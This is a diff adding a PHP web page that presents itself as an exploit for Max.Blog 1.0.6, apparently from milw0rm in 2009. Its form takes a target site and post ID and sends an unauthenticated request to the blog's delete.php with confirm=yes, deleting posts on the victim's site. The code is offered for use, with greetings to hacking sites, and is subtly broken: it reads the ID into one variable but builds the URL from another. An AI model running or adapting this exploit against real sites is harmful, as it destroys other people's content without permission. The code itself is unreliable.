@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>Max.Blog 1.0.6 Delete Post Exploit</title>
+</head>
+
+<body>
+<p align="center">
+<b>Max.Blog 1.0.6 Delete Post Exploit</b><br /><br />
+<b>Discovered by <b>SirGod</b><br />
+Thanks to <b>Nytro</b><br />
+Please visit : <br />
+------------------------<br />
+www.mortal-team.org<br />
+------------------------<br />
+www.h4cky0u.org<br />
+------------------------<br />
+www.xpl0it.info<br />
+------------------------<br />
+www.anti-intruders.org<br />
+------------------------<br />
+</b>
+</p>
+
+<?php
+if(isset($_POST['submit']))
+{
+    $site=$_POST['site'];
+	$id=$_POST['post_id'];
+	$pagina=file_get_contents("http://".$site."/delete.php?post=".$post_id."&confirm=yes");
+	print "<p align=\"center\">Done!</p><br />";
+}
+
+?>
+
+<form method="POST">
+<p align="center">
+Site: www. <input type="text" name="site" value="site.com/path" /><br
+/> (without http,www and trailing slash)<br />
+Post ID: <input type="text" name="post_id" value="1" /><br /><br />
+<input type="submit" name="submit" value="Delete" />
+</p>
+</form>
+</body>
+</html>
+
+# milw0rm.com [2009-01-20]
